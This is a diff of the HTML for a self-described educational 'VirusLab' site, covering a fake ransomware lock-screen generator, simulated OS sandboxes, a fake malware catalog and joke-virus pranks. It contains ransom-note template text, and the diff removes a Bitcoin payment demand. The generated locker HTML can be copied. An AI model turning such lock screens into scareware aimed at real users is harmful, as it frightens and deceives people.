+    <span id="notifMsg" style="font-size:13px;font-weight:500;"></span>
   </div>
 </div>
 
 <!-- NAV -->
-<nav class="nav-glass fixed top-0 left-0 right-0 z-50 px-6 py-3 flex items-center gap-6">
+<nav class="nav-glass fixed top-0 left-0 right-0 z-50 px-6 py-3 flex items-center gap-4 flex-wrap">
   <div class="flex items-center gap-3">
     <span class="glitch" style="font-size:22px;">☣️</span>
-    <span class="font-bold text-white" style="font-size:16px; letter-spacing:1px; font-family:'JetBrains Mono',monospace;">VirusLab<span style="color:rgba(255,255,255,0.3);">.studio</span></span>
+    <span class="font-bold text-white" style="font-size:16px;letter-spacing:1px;font-family:'JetBrains Mono',monospace;">VirusLab<span style="color:rgba(255,255,255,.3);">.studio</span></span>
     <span class="badge badge-red">FAKE / EDUCATIONAL</span>
   </div>
-  <div class="flex items-center gap-2 ml-auto">
-    <button class="tab-btn active" onclick="showPage('creator')" id="nav-creator">🔒 WinLocker Creator</button>
+  <div class="flex items-center gap-2 ml-auto flex-wrap">
+    <button class="tab-btn active" onclick="showPage('creator')" id="nav-creator">🔒 WinLocker</button>
     <button class="tab-btn" onclick="showPage('sandbox')" id="nav-sandbox">🖥️ Sandboxes</button>
     <button class="tab-btn" onclick="showPage('viruses')" id="nav-viruses">🦠 Virus Lab</button>
+    <button class="tab-btn" onclick="showPage('jokes')" id="nav-jokes">🎭 Joke Viruses</button>
   </div>
 </nav>
 
-<!-- MAIN CONTAINER -->
-<div style="padding-top:70px; min-height:100vh; position:relative; z-index:1;">
+<div style="padding-top:70px;min-height:100vh;position:relative;z-index:1;">
 
-<!-- ════════════════════════════════════════════
-     PAGE 1: WINLOCKER CREATOR
-═════════════════════════════════════════════ -->
-<div id="page-creator" class="page active px-6 py-8 gap-6" style="max-width:1400px; margin:0 auto;">
-
+<!-- ══════════════════════════════════════════
+     PAGE 1 — WINLOCKER CREATOR
+══════════════════════════════════════════ -->
+<div id="page-creator" class="page active px-6 py-8 gap-6" style="max-width:1400px;margin:0 auto;">
   <div class="text-center mb-2">
-    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;">
-      <span class="glitch">WinLocker Creator</span>
-    </h1>
-    <p style="color:rgba(255,255,255,0.4); font-size:13px; margin-top:8px;">Build fake ransomware screens — 100% educational & visual only</p>
+    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;"><span class="glitch">WinLocker Creator</span></h1>
+    <p style="color:rgba(255,255,255,.4);font-size:13px;margin-top:8px;">Build fake ransomware screens — 100% visual only, no functionality</p>
   </div>
 
   <div class="flex gap-6 flex-wrap lg:flex-nowrap">
+    <!-- CONTROLS -->
+    <div class="glass flex flex-col gap-4 p-6" style="flex:0 0 370px;min-width:300px;">
+      <div class="flex items-center gap-2 mb-1"><span>🔧</span><span class="font-semibold" style="font-size:14px;">Locker Configuration</span></div>
 
-    <!-- LEFT: CONTROLS -->
-    <div class="glass flex flex-col gap-5 p-6" style="flex:0 0 380px; min-width:320px;">
-      <div class="flex items-center gap-2 mb-1">
-        <span>🔧</span>
-        <span class="font-semibold" style="font-size:14px;">Locker Configuration</span>
-      </div>
+      <div><label class="creator-label">🦠 Virus / Executable Name</label><input class="creator-input" id="cfg-virusname" value="SalienWin.exe"></div>
+      <div><label class="creator-label">📌 Window Title</label><input class="creator-input" id="cfg-title" value="⚠️ YOUR FILES ARE ENCRYPTED ⚠️"></div>
+      <div><label class="creator-label">💬 Main Message</label><textarea class="creator-input" id="cfg-msg" rows="3">All your files have been encrypted by SalienWin Ransomware v3.2. Your data is held hostage.</textarea></div>
+      <div><label class="creator-label">📋 Sub / Technical Info</label><textarea class="creator-input" id="cfg-sub" rows="2">Contact ID: SLWN-9821-XXFA | Deadline expires when timer hits zero.</textarea></div>
 
-      <!-- Virus Name -->
-      <div>
-        <label class="creator-label">🦠 Virus / Executable Name</label>
-        <input class="creator-input" id="cfg-virusname" placeholder="e.g. SalienWin.exe" value="SalienWin.exe">
-      </div>
-
-      <!-- Title -->
-      <div>
-        <label class="creator-label">📌 Window Title</label>
-        <input class="creator-input" id="cfg-title" placeholder="e.g. YOUR FILES ARE ENCRYPTED" value="⚠️ YOUR FILES ARE ENCRYPTED ⚠️">
-      </div>
-
-      <!-- Main Message -->
-      <div>
-        <label class="creator-label">💬 Main Message</label>
-        <textarea class="creator-input" id="cfg-msg" rows="3" placeholder="Message shown to victim...">All your files have been encrypted by SalienWin Ransomware v3.2. Pay to restore access to your data.</textarea>
-      </div>
-
-      <!-- Sub Message -->
-      <div>
-        <label class="creator-label">📋 Sub Message</label>
-        <textarea class="creator-input" id="cfg-sub" rows="2" placeholder="Technical info / Bitcoin address...">Send 0.05 BTC to: 1A2b3C4d5E6f7G8h9I0j | ID: SLWN-9821-XXFA</textarea>
-      </div>
-
-      <!-- Timer -->
       <div class="flex gap-3">
-        <div style="flex:1">
-          <label class="creator-label">⏱️ Timer (seconds)</label>
-          <input class="creator-input" id="cfg-timer" type="number" min="0" max="999999" value="86400" placeholder="86400">
-        </div>
-        <div style="flex:1">
-          <label class="creator-label">🎨 Theme</label>
+        <div style="flex:1"><label class="creator-label">⏱️ Timer (seconds)</label><input class="creator-input" id="cfg-timer" type="number" min="10" max="999999" value="86400"></div>
+        <div style="flex:1"><label class="creator-label">🎨 Theme</label>
           <select class="creator-input" id="cfg-theme">
             <option value="red">🔴 Red Terror</option>
             <option value="blue">🔵 Blue Gov</option>
@@ -513,202 +232,141 @@
         </div>
       </div>
 
-      <!-- Button Text -->
-      <div>
-        <label class="creator-label">🔘 Pay Button Text</label>
-        <input class="creator-input" id="cfg-btntext" placeholder="e.g. DECRYPT MY FILES" value="💳 PAY NOW — DECRYPT FILES">
-      </div>
-
-      <!-- Button 2 -->
-      <div>
-        <label class="creator-label">🔘 Secondary Button (optional)</label>
-        <input class="creator-input" id="cfg-btn2" placeholder="e.g. Contact Support" value="📞 CONTACT OPERATOR">
-      </div>
-
-      <!-- Emoji/Icon -->
-      <div>
-        <label class="creator-label">☠️ Icon / Emoji</label>
-        <input class="creator-input" id="cfg-icon" placeholder="Emoji or symbol" value="☠️">
-      </div>
-
-      <!-- OS Target -->
-      <div>
-        <label class="creator-label">🖥️ Target OS Style</label>
-        <select class="creator-input" id="cfg-os">
-          <option value="windows">Windows</option>
-          <option value="mac">macOS</option>
-          <option value="linux">Linux/Debian</option>
-        </select>
-      </div>
-
-      <!-- Extras -->
-      <div>
-        <label class="creator-label">⚙️ Effects</label>
-        <div class="flex flex-wrap gap-2">
-          <label style="font-size:12px; color:rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px; cursor:pointer;">
-            <input type="checkbox" id="fx-scanlines" checked style="accent-color:#fff;"> Scanlines
-          </label>
-          <label style="font-size:12px; color:rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px; cursor:pointer;">
-            <input type="checkbox" id="fx-glitch" checked style="accent-color:#fff;"> Glitch Text
-          </label>
-          <label style="font-size:12px; color:rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px; cursor:pointer;">
-            <input type="checkbox" id="fx-pulse" checked style="accent-color:#fff;"> Pulse Icon
-          </label>
-          <label style="font-size:12px; color:rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px; cursor:pointer;">
-            <input type="checkbox" id="fx-bgscan" style="accent-color:#fff;"> BG Scanlines
-          </label>
+      <div><label class="creator-label">🔘 Primary Button Text</label><input class="creator-input" id="cfg-btntext" value="[CODE ONLY — VISUAL DEMO]"></div>
+      <div><label class="creator-label">🔘 Secondary Button (optional)</label><input class="creator-input" id="cfg-btn2" value="📞 CONTACT OPERATOR [FAKE]"></div>
+      <div class="flex gap-3">
+        <div style="flex:1"><label class="creator-label">☠️ Icon</label><input class="creator-input" id="cfg-icon" value="☠️"></div>
+        <div style="flex:1"><label class="creator-label">🖥️ OS Style</label>
+          <select class="creator-input" id="cfg-os">
+            <option value="windows">Windows</option>
+            <option value="mac">macOS</option>
+            <option value="linux">Linux</option>
+          </select>
         </div>
       </div>
 
-      <button class="btn-gen btn-danger w-full mt-2" onclick="buildLocker()">⚡ GENERATE WINLOCKER</button>
+      <div><label class="creator-label">⚙️ Visual Effects</label>
+        <div class="flex flex-wrap gap-3">
+          <label style="font-size:12px;color:rgba(255,255,255,.6);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="checkbox" id="fx-scanlines" checked style="accent-color:#fff;"> Scanlines</label>
+          <label style="font-size:12px;color:rgba(255,255,255,.6);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="checkbox" id="fx-glitch" checked style="accent-color:#fff;"> Glitch</label>
+          <label style="font-size:12px;color:rgba(255,255,255,.6);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="checkbox" id="fx-pulse" checked style="accent-color:#fff;"> Pulse</label>
+          <label style="font-size:12px;color:rgba(255,255,255,.6);display:flex;align-items:center;gap:6px;cursor:pointer;"><input type="checkbox" id="fx-bgscan" style="accent-color:#fff;"> BG Lines</label>
+        </div>
+      </div>
+
+      <button class="btn-gen btn-danger w-full" onclick="buildLocker()">⚡ GENERATE WINLOCKER</button>
       <button class="btn-gen w-full" onclick="deployToSandbox()" style="font-size:13px;">🖥️ Deploy to Sandbox</button>
     </div>
 
-    <!-- RIGHT: PREVIEW -->
-    <div class="flex flex-col gap-4" style="flex:1; min-width:300px;">
+    <!-- PREVIEW + CODE -->
+    <div class="flex flex-col gap-4" style="flex:1;min-width:300px;">
       <div class="flex items-center gap-3 mb-1">
-        <span style="font-size:13px; color:rgba(255,255,255,0.5);">Live Preview</span>
-        <span class="badge badge-red">FAKE</span>
+        <span style="font-size:13px;color:rgba(255,255,255,.5);">Live Preview</span>
+        <span class="badge badge-red">VISUAL ONLY — NO PAYMENT FUNCTIONALITY</span>
       </div>
 
-      <!-- PREVIEW WINDOW -->
-      <div class="glass" style="overflow:hidden; min-height:520px;">
-        <!-- Titlebar (OS specific) -->
-        <div id="preview-titlebar">
-          <!-- rendered by JS -->
-        </div>
-        <!-- Locker Screen -->
-        <div id="preview-locker" class="locker-overlay" style="position:relative; min-height:480px;">
-          <!-- rendered by JS -->
-        </div>
+      <div class="glass" style="overflow:hidden;min-height:500px;">
+        <div id="preview-titlebar"></div>
+        <div id="preview-locker" style="position:relative;min-height:460px;"></div>
       </div>
 
-      <!-- GENERATED CODE -->
       <div class="glass" style="overflow:hidden;">
-        <div style="padding:10px 14px; border-bottom:1px solid rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:space-between;">
-          <span style="font-size:12px; color:rgba(255,255,255,0.4); font-family:'JetBrains Mono',monospace;">// generated-locker.html</span>
-          <button class="btn-gen" style="padding:4px 14px; font-size:11px;" onclick="copyCode()">📋 Copy</button>
+        <div style="padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between;">
+          <span style="font-size:12px;color:rgba(255,255,255,.4);font-family:'JetBrains Mono',monospace;">// generated-locker.html — DEMO CODE ONLY</span>
+          <button class="btn-gen" style="padding:4px 14px;font-size:11px;" onclick="copyCode()">📋 Copy Code</button>
         </div>
-        <div class="terminal" style="max-height:180px; overflow-y:auto;" id="code-output">
-          <span class="out">// Click GENERATE WINLOCKER to see HTML code</span>
-        </div>
+        <div class="terminal" style="max-height:180px;overflow-y:auto;" id="code-output"><span class="out">// Click GENERATE WINLOCKER to see the HTML code output</span></div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ════════════════════════════════════════════
-     PAGE 2: SANDBOXES
-═════════════════════════════════════════════ -->
-<div id="page-sandbox" class="page px-6 py-8 gap-6" style="max-width:1400px; margin:0 auto;">
-
+<!-- ══════════════════════════════════════════
+     PAGE 2 — SANDBOXES
+══════════════════════════════════════════ -->
+<div id="page-sandbox" class="page px-6 py-8 gap-6" style="max-width:1400px;margin:0 auto;">
   <div class="text-center mb-2">
-    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;">
-      <span class="glitch">Sandbox Environment</span>
-    </h1>
-    <p style="color:rgba(255,255,255,0.4); font-size:13px; margin-top:8px;">Fake interactive OS sandboxes — run simulated malware visually</p>
+    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;"><span class="glitch">Sandbox Environment</span></h1>
+    <p style="color:rgba(255,255,255,.4);font-size:13px;margin-top:8px;">Fake interactive OS sandboxes — fully simulated, no real execution</p>
   </div>
 
-  <!-- OS SELECTOR -->
-  <div class="flex gap-3 flex-wrap">
+  <div class="flex gap-3 flex-wrap items-center">
     <button class="tab-btn active" id="sb-windows" onclick="switchSandbox('windows')">🪟 Windows 11</button>
-    <button class="tab-btn" id="sb-linux" onclick="switchSandbox('linux')">🐧 Linux (Debian)</button>
+    <button class="tab-btn" id="sb-linux" onclick="switchSandbox('linux')">🐧 Linux / Debian</button>
     <button class="tab-btn" id="sb-mac" onclick="switchSandbox('mac')">🍎 macOS</button>
-    <div class="ml-auto flex gap-2">
-      <button class="btn-gen btn-danger" style="padding:6px 16px; font-size:12px;" onclick="infectSandbox()">🦠 Inject Virus</button>
-      <button class="btn-gen" style="padding:6px 16px; font-size:12px;" onclick="clearSandbox()">🧹 Clean</button>
+    <div class="ml-auto flex gap-2 flex-wrap">
+      <button class="btn-gen btn-danger" style="padding:6px 16px;font-size:12px;" onclick="infectSandbox()">🦠 Inject Virus</button>
+      <button class="btn-gen" style="padding:6px 16px;font-size:12px;" onclick="clearSandbox()">🧹 Clean Sandbox</button>
     </div>
   </div>
 
-  <!-- WINDOWS SANDBOX -->
-  <div id="sandbox-windows" class="glass" style="overflow:hidden; height:560px; position:relative;">
+  <!-- WINDOWS -->
+  <div id="sandbox-windows" class="glass" style="overflow:hidden;height:560px;position:relative;">
     <div class="scan-line"></div>
     <div class="win-titlebar">
-      <div class="win-btn win-close"></div>
-      <div class="win-btn win-min"></div>
-      <div class="win-btn win-max"></div>
-      <div class="win-title">Windows 11 — Sandbox Environment [FAKE]</div>
-      <span class="badge badge-red" style="font-size:9px;">SIMULATED</span>
+      <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+      <div class="win-title">Windows 11 Sandbox [SIMULATED — FAKE]</div>
+      <span class="badge badge-red" style="font-size:9px;">NOT REAL</span>
     </div>
-    <div class="win-desktop" style="height:512px; position:relative;">
-      <!-- Desktop Icons -->
-      <div style="padding:20px; display:flex; flex-direction:column; gap:8px; position:absolute; top:0; left:0;">
+    <div class="win-desktop" style="height:512px;position:relative;">
+      <div style="padding:20px;display:flex;flex-direction:column;gap:8px;position:absolute;top:0;left:0;">
         <div class="win-icon" ondblclick="openApp('notepad')"><div class="ico">📝</div><span>notepad.exe</span></div>
         <div class="win-icon" ondblclick="openApp('explorer')"><div class="ico">📁</div><span>Explorer</span></div>
         <div class="win-icon" ondblclick="openApp('cmd')"><div class="ico">⬛</div><span>cmd.exe</span></div>
-        <div class="win-icon" ondblclick="openApp('task')"><div class="ico">📊</div><span>Task Mgr</span></div>
+        <div class="win-icon" ondblclick="openApp('task')"><div class="ico">📊</div><span>Task Manager</span></div>
         <div class="win-icon" ondblclick="openApp('reg')"><div class="ico">🗝️</div><span>regedit</span></div>
         <div class="win-icon" id="salienwin-icon" style="display:none;" ondblclick="openApp('virus')"><div class="ico">☠️</div><span style="color:#ff6666;">SalienWin.exe</span></div>
       </div>
-      <!-- Wallpaper -->
-      <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;pointer-events:none;">
-        <div style="font-size:48px;opacity:0.05;">🪟</div>
-      </div>
-      <!-- App Windows rendered here -->
       <div id="win-apps"></div>
-      <!-- Locker overlay (hidden by default) -->
-      <div id="win-locker-overlay" style="display:none; position:absolute;inset:0;z-index:100;border-radius:0 0 12px 12px;"></div>
-      <!-- Taskbar -->
+      <div id="win-locker-overlay" style="display:none;position:absolute;inset:0;z-index:100;border-radius:0 0 12px 12px;"></div>
       <div class="win-taskbar">
-        <div class="taskbar-icon" title="Start">🪟</div>
-        <div class="taskbar-icon" title="Search">🔍</div>
-        <div class="taskbar-icon" title="Files">📁</div>
-        <div class="taskbar-icon" title="Browser">🌐</div>
-        <div class="taskbar-icon" title="Terminal">⬛</div>
+        <div class="taskbar-icon">🪟</div>
+        <div class="taskbar-icon">🔍</div>
+        <div class="taskbar-icon">📁</div>
+        <div class="taskbar-icon">🌐</div>
+        <div class="taskbar-icon">⬛</div>
         <div class="win-clock" id="win-clock">00:00</div>
       </div>
     </div>
   </div>
 
-  <!-- LINUX SANDBOX -->
-  <div id="sandbox-linux" class="glass" style="overflow:hidden; height:560px; display:none; position:relative;">
+  <!-- LINUX -->
+  <div id="sandbox-linux" class="glass" style="overflow:hidden;height:560px;display:none;position:relative;">
     <div class="scan-line"></div>
     <div class="linux-titlebar">
       <div class="linux-title">Debian GNU/Linux — bash — 80×24 [FAKE SANDBOX]</div>
-      <div class="linux-btns">
-        <div class="linux-btn">─</div>
-        <div class="linux-btn">□</div>
-        <div class="linux-btn">✕</div>
-      </div>
+      <div class="linux-btns"><div class="linux-btn">─</div><div class="linux-btn">□</div><div class="linux-btn">✕</div></div>
     </div>
-    <div class="terminal" style="height:512px; overflow-y:auto;" id="linux-terminal">
+    <div class="terminal" style="height:460px;overflow-y:auto;" id="linux-terminal">
       <div><span class="ok">┌──(</span><span class="prompt">root㉿debian</span><span class="ok">)-[</span><span class="warn">~</span><span class="ok">]</span></div>
       <div><span class="ok">└─$</span> <span class="cmd">uname -a</span></div>
       <div><span class="out">Linux debian 6.1.0-kali9-amd64 #1 SMP Debian 6.1.27-1kali1 x86_64 GNU/Linux</span></div>
       <div><span class="ok">┌──(</span><span class="prompt">root㉿debian</span><span class="ok">)-[</span><span class="warn">~</span><span class="ok">]</span></div>
       <div><span class="ok">└─$</span> <span class="cursor"></span></div>
     </div>
-    <div style="position:absolute; bottom:0; left:0; right:0; padding:8px 12px; background:rgba(0,0,0,0.7); border-top:1px solid rgba(255,255,255,0.06);">
+    <div style="position:absolute;bottom:0;left:0;right:0;padding:8px 12px;background:rgba(0,0,0,.75);border-top:1px solid rgba(255,255,255,.06);">
       <div class="flex gap-2">
-        <input class="creator-input" id="linux-input" placeholder="Type command and press Enter..." style="flex:1; padding:6px 12px; font-family:'JetBrains Mono',monospace; font-size:12px;" onkeydown="linuxCommand(event)">
-        <button class="btn-gen" style="padding:6px 14px; font-size:12px;" onclick="linuxCommand({key:'Enter'})">↵</button>
+        <input class="creator-input" id="linux-input" placeholder="Type command and press Enter..." style="flex:1;padding:6px 12px;font-family:'JetBrains Mono',monospace;font-size:12px;" onkeydown="linuxCommand(event)">
+        <button class="btn-gen" style="padding:6px 14px;font-size:12px;" onclick="linuxCommand({key:'Enter'})">↵</button>
       </div>
     </div>
   </div>
 
-  <!-- MAC SANDBOX -->
-  <div id="sandbox-mac" class="glass" style="overflow:hidden; height:560px; display:none; position:relative;">
+  <!-- MAC -->
+  <div id="sandbox-mac" class="glass" style="overflow:hidden;height:560px;display:none;position:relative;">
     <div class="scan-line"></div>
     <div class="mac-titlebar">
-      <div class="win-btn win-close"></div>
-      <div class="win-btn win-min"></div>
-      <div class="win-btn win-max"></div>
+      <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
       <div class="win-title">macOS Sonoma — Sandbox [FAKE]</div>
       <span class="badge badge-red" style="font-size:9px;">SIMULATED</span>
     </div>
-    <div class="mac-desktop" style="height:512px; position:relative;">
+    <div class="mac-desktop" style="height:512px;position:relative;">
       <div class="mac-menubar">
         <span class="mac-menu-item">🍎</span>
-        <span class="mac-menu-item">Finder</span>
-        <span class="mac-menu-item">File</span>
-        <span class="mac-menu-item">Edit</span>
-        <span class="mac-menu-item">View</span>
-        <span class="mac-menu-item">Go</span>
-        <span class="mac-menu-item">Window</span>
+        <span class="mac-menu-item">Finder</span><span class="mac-menu-item">File</span><span class="mac-menu-item">Edit</span><span class="mac-menu-item">View</span><span class="mac-menu-item">Go</span><span class="mac-menu-item">Window</span>
         <span class="mac-menu-item" style="margin-left:auto;" id="mac-clock">--:--</span>
       </div>
-      <!-- Desktop Items -->
-      <div style="position:absolute; top:40px; right:20px; display:flex; flex-direction:column; gap:8px;">
+      <div style="position:absolute;top:40px;right:20px;display:flex;flex-direction:column;gap:8px;">
         <div class="win-icon" ondblclick="macOpenApp('terminal')"><div class="ico">🖥️</div><span>Terminal</span></div>
         <div class="win-icon" ondblclick="macOpenApp('finder')"><div class="ico">📂</div><span>Finder</span></div>
         <div class="win-icon" ondblclick="macOpenApp('safari')"><div class="ico">🧭</div><span>Safari</span></div>
@@ -717,106 +375,80 @@
       <div id="mac-apps"></div>
       <div id="mac-locker-overlay" style="display:none;position:absolute;inset:0;z-index:100;border-radius:0 0 12px 12px;"></div>
       <div class="mac-dock">
-        <div class="dock-icon" title="Finder">📂</div>
-        <div class="dock-icon" title="Terminal">🖥️</div>
-        <div class="dock-icon" title="Safari">🧭</div>
-        <div class="dock-icon" title="Calculator">🔢</div>
-        <div class="dock-icon" title="Settings">⚙️</div>
-        <div class="dock-icon" title="Trash">🗑️</div>
+        <div class="dock-icon">📂</div><div class="dock-icon">🖥️</div><div class="dock-icon">🧭</div><div class="dock-icon">🔢</div><div class="dock-icon">⚙️</div><div class="dock-icon">🗑️</div>
       </div>
     </div>
   </div>
 
-  <!-- DEBIAN TERMINAL SANDBOX (separate from the main linux) -->
+  <!-- ACTIVITY LOG -->
   <div class="glass" style="overflow:hidden;">
     <div class="win-titlebar">
-      <div class="win-btn win-close"></div>
-      <div class="win-btn win-min"></div>
-      <div class="win-btn win-max"></div>
-      <div class="win-title">Analysis Terminal — Virus Activity Log</div>
+      <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+      <div class="win-title">Activity Log — Sandbox Monitor</div>
     </div>
-    <div class="terminal" style="height:160px; overflow-y:auto;" id="activity-log">
+    <div class="terminal" style="height:130px;overflow-y:auto;" id="activity-log">
       <div><span class="out">[VIRUSLAB] Sandbox initialized. No threats detected.</span></div>
-      <div><span class="ok">[OK]</span> <span class="out">Memory: 4096MB / CPU: x86_64 / OS: Multi-Sandbox v1.0</span></div>
-      <div><span class="out">[MONITOR] Watching for process injection...</span></div>
+      <div><span class="ok">[OK]</span> <span class="out">Memory: 4096MB / CPU: x86_64 / OS: Multi-Sandbox v2.0</span></div>
       <div><span class="cursor"></span></div>
     </div>
   </div>
 </div>
 
-<!-- ════════════════════════════════════════════
-     PAGE 3: VIRUS LAB
-═════════════════════════════════════════════ -->
-<div id="page-viruses" class="page px-6 py-8 gap-6" style="max-width:1400px; margin:0 auto;">
-
+<!-- ══════════════════════════════════════════
+     PAGE 3 — VIRUS LAB
+══════════════════════════════════════════ -->
+<div id="page-viruses" class="page px-6 py-8 gap-6" style="max-width:1400px;margin:0 auto;">
   <div class="text-center mb-2">
-    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;">
-      <span class="glitch">Virus Lab</span>
-    </h1>
-    <p style="color:rgba(255,255,255,0.4); font-size:13px; margin-top:8px;">Fake malware catalog — select and simulate in sandbox</p>
+    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;"><span class="glitch">Virus Lab</span></h1>
+    <p style="color:rgba(255,255,255,.4);font-size:13px;margin-top:8px;">Fake malware catalog — all simulated, zero real execution</p>
   </div>
 
   <div class="flex gap-6 flex-wrap lg:flex-nowrap">
-
-    <!-- VIRUS LIST -->
-    <div class="glass p-5 flex flex-col gap-3" style="flex:0 0 340px; min-width:280px;">
-      <div class="flex items-center justify-between mb-2">
+    <div class="glass p-5 flex flex-col gap-3" style="flex:0 0 340px;min-width:260px;max-height:600px;overflow-y:auto;">
+      <div class="flex items-center justify-between mb-1">
         <span class="font-semibold" style="font-size:14px;">🦠 Malware Database</span>
-        <span class="badge badge-red">FAKE</span>
+        <span class="badge badge-red">ALL FAKE</span>
       </div>
-
-      <div id="virus-list" class="flex flex-col gap-2">
-        <!-- rendered by JS -->
-      </div>
+      <div id="virus-list" class="flex flex-col gap-2"></div>
     </div>
 
-    <!-- VIRUS DETAIL -->
     <div class="flex flex-col gap-4" style="flex:1;">
-
-      <!-- Info Card -->
       <div class="glass p-5" id="virus-detail">
-        <div class="text-center py-8" style="color:rgba(255,255,255,0.25);">
-          <div style="font-size:40px;">🦠</div>
-          <div style="font-size:13px; margin-top:8px;">Select a virus from the list</div>
+        <div class="text-center py-10" style="color:rgba(255,255,255,.2);">
+          <div style="font-size:48px;">🦠</div>
+          <div style="font-size:13px;margin-top:8px;">Select a virus from the list</div>
         </div>
       </div>
 
-      <!-- FAKE PROCESS EXPLORER -->
+      <!-- Process Explorer -->
       <div class="glass" style="overflow:hidden;">
         <div class="win-titlebar">
-          <div class="win-btn win-close"></div>
-          <div class="win-btn win-min"></div>
-          <div class="win-btn win-max"></div>
-          <div class="win-title">Process Explorer — Fake Process Monitor</div>
+          <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+          <div class="win-title">Process Explorer [FAKE]</div>
         </div>
-        <div class="terminal" style="height:200px; overflow-y:auto; padding:0;">
-          <table style="width:100%; border-collapse:collapse; font-size:11px;">
-            <thead>
-              <tr style="background:rgba(255,255,255,0.04); border-bottom:1px solid rgba(255,255,255,0.06);">
-                <th style="padding:8px 12px; text-align:left; color:rgba(255,255,255,0.5); font-weight:500;">Process</th>
-                <th style="padding:8px 12px; text-align:left; color:rgba(255,255,255,0.5); font-weight:500;">PID</th>
-                <th style="padding:8px 12px; text-align:left; color:rgba(255,255,255,0.5); font-weight:500;">CPU%</th>
-                <th style="padding:8px 12px; text-align:left; color:rgba(255,255,255,0.5); font-weight:500;">MEM</th>
-                <th style="padding:8px 12px; text-align:left; color:rgba(255,255,255,0.5); font-weight:500;">Status</th>
-              </tr>
-            </thead>
-            <tbody id="process-table">
-            </tbody>
+        <div class="terminal" style="height:180px;overflow-y:auto;padding:0;">
+          <table style="width:100%;border-collapse:collapse;font-size:11px;">
+            <thead><tr style="background:rgba(255,255,255,.04);border-bottom:1px solid rgba(255,255,255,.06);">
+              <th style="padding:7px 12px;text-align:left;color:rgba(255,255,255,.45);font-weight:500;">Process</th>
+              <th style="padding:7px;text-align:left;color:rgba(255,255,255,.45);font-weight:500;">PID</th>
+              <th style="padding:7px;text-align:left;color:rgba(255,255,255,.45);font-weight:500;">CPU%</th>
+              <th style="padding:7px;text-align:left;color:rgba(255,255,255,.45);font-weight:500;">MEM</th>
+              <th style="padding:7px;text-align:left;color:rgba(255,255,255,.45);font-weight:500;">Status</th>
+            </tr></thead>
+            <tbody id="process-table"></tbody>
           </table>
         </div>
       </div>
 
-      <!-- FAKE NETWORK MONITOR -->
+      <!-- Network Monitor -->
       <div class="glass" style="overflow:hidden;">
         <div class="win-titlebar">
-          <div class="win-btn win-close"></div>
-          <div class="win-btn win-min"></div>
-          <div class="win-btn win-max"></div>
-          <div class="win-title">Network Monitor — Fake Traffic Analyzer</div>
+          <div class="win-btn win-close"></div><div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+          <div class="win-title">Network Monitor [FAKE]</div>
         </div>
-        <div class="terminal" style="height:140px; overflow-y:auto;" id="net-monitor">
-          <div><span class="out">[NET] Monitoring network interfaces...</span></div>
-          <div><span class="ok">[CONN]</span> <span class="out">eth0 → 192.168.1.1 — status: IDLE</span></div>
+        <div class="terminal" style="height:120px;overflow-y:auto;" id="net-monitor">
+          <div><span class="out">[NET] Monitoring interfaces...</span></div>
+          <div><span class="ok">[CONN]</span> <span class="out">eth0 → 192.168.1.1 — IDLE</span></div>
           <div><span class="cursor"></span></div>
         </div>
       </div>
@@ -824,13 +456,162 @@
   </div>
 </div>
 
-</div><!-- /main container -->
+<!-- ══════════════════════════════════════════
+     PAGE 4 — JOKE VIRUSES
+══════════════════════════════════════════ -->
+<div id="page-jokes" class="page px-6 py-8 gap-6" style="max-width:1400px;margin:0 auto;">
+  <div class="text-center mb-2">
+    <h1 class="text-4xl font-bold tracking-tight" style="font-family:'JetBrains Mono',monospace;"><span class="glitch">🎭 Joke Virus Simulator</span></h1>
+    <p style="color:rgba(255,255,255,.4);font-size:13px;margin-top:8px;">Classic internet prank effects — all run inside this page, nothing actually harmful</p>
+  </div>
+
+  <div class="grid gap-4" style="grid-template-columns:repeat(auto-fill,minmax(280px,1fr));">
+
+    <!-- BSOD -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">💙</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">BSoD.exe</div><div class="badge badge-blue" style="margin-top:4px;">JOKE</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Fake Windows Blue Screen of Death. Full screen, realistic text, fake crash dump counter.</p>
+      <button class="btn-gen btn-danger" onclick="runBSOD()">▶ RUN BSOD</button>
+    </div>
+
+    <!-- POPUP STORM -->
+    <div class="glass p-5 flex flex-col gap-3">
+      <div class="flex items-center gap-3"><span style="font-size:32px;">💥</span>
+        <div><div class="font-bold" style="font-family:'JetBrains Mono',monospace;">PopupStorm.exe</div><div class="badge badge-red" style="margin-top:4px;">ANNOYING</div></div>
+      </div>
+      <p style="font-size:12px;color:rgba(255,255,255,.5);line-height:1.6;">Spawns endless fake Windows XP error dialogs all over the screen that fight for your attention.</p>
+      <div class="flex gap-2">
+        <button class="btn-gen btn-danger" style="flex:1;" onclick="startPopupStorm()">▶ START STORM</button>
+        <button class="btn-gen" style="flex:1;font-size:12px;" onclick="stopPopupStorm()">■ STOP</button>
+      </div>
+    </div>
+
+    <!-- MATRIX -->
